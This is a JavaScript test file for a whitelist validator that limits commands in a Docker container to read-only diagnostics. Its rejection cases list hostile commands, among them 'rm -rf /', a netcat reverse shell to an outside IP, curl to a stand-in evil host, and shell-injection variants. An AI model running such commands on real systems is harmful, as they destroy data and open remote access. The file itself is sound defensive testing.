import assert from 'node:assert/strict';
import test from 'node:test';
import { assertReadonlyExecutable } from '../src/lib/docker-exec.js';

test('只读白名单允许系统信息类命令', () => {
  for (const cmd of [
    'env', 'printenv', 'ps', 'ps aux', 'top -b -n 1',
    'netstat -tulpn', 'ss -tulpn', 'cat /etc/os-release', 'head -100 /var/log/app.log',
    'tail -50 /var/log/app.log', 'ls -la', 'df -h', 'du -sh /data', 'free -m',
    'uptime', 'uname -a', 'hostname', 'date', 'whoami', 'id', 'ip addr',
    'ping -c 4 127.0.0.1',
  ]) {
    assert.doesNotThrow(() => assertReadonlyExecutable(cmd), `应允许:${cmd}`);
  }
});

test('只读白名单拒绝有副作用的命令', () => {
  for (const cmd of [
    'rm -rf /', 'curl http://evil.example.com', 'wget http://evil.example.com',
    'echo hi > /etc/passwd', 'kill 1', 'nc -e /bin/sh 1.2.3.4', 'top -b -n 9999',
    'systemctl stop docker', 'apt-get install x', 'mv /etc/hosts /tmp/h',
  ]) assert.throws(() => assertReadonlyExecutable(cmd), undefined, `应拒绝:${cmd}`);
});

test('assertReadonlyExecutable 对空命令与越权命令抛错', () => {
  assert.throws(() => assertReadonlyExecutable(''), /命令为空/);
  assert.throws(() => assertReadonlyExecutable('   '), /命令为空/);
  assert.throws(() => assertReadonlyExecutable(null), /命令为空/);
  assert.throws(() => assertReadonlyExecutable('curl http://x'), /仅允许执行只读探测命令/);
  assert.throws(() => assertReadonlyExecutable('rm -rf /'), /仅允许执行只读探测命令/);
  assert.doesNotThrow(() => assertReadonlyExecutable('ps aux'));
});

test('只读白名单拒绝 env 子进程逃逸、shell 控制符和危险参数变形', () => {
  for (const cmd of [
    'env sh -c id', 'env -i /bin/sh -c id', 'env FOO=bar sh -c id',
    'cat /etc/passwd; rm -rf /', 'ps aux | sh', 'cat $(id)', 'cat /etc/passwd\\nrm -rf /',
    'xcat /etc/passwd', 'evilnetstat -tulpn', 'top -b -n 9999', 'ip route',
    'ping -c 999999 127.0.0.1', 'ping 127.0.0.1',
  ]) assert.throws(() => assertReadonlyExecutable(cmd), undefined, `应拒绝:${cmd}`);
  assert.doesNotThrow(() => assertReadonlyExecutable('env'));
  assert.doesNotThrow(() => assertReadonlyExecutable('top -b -n 1'));
  assert.doesNotThrow(() => assertReadonlyExecutable('ip addr'));
});
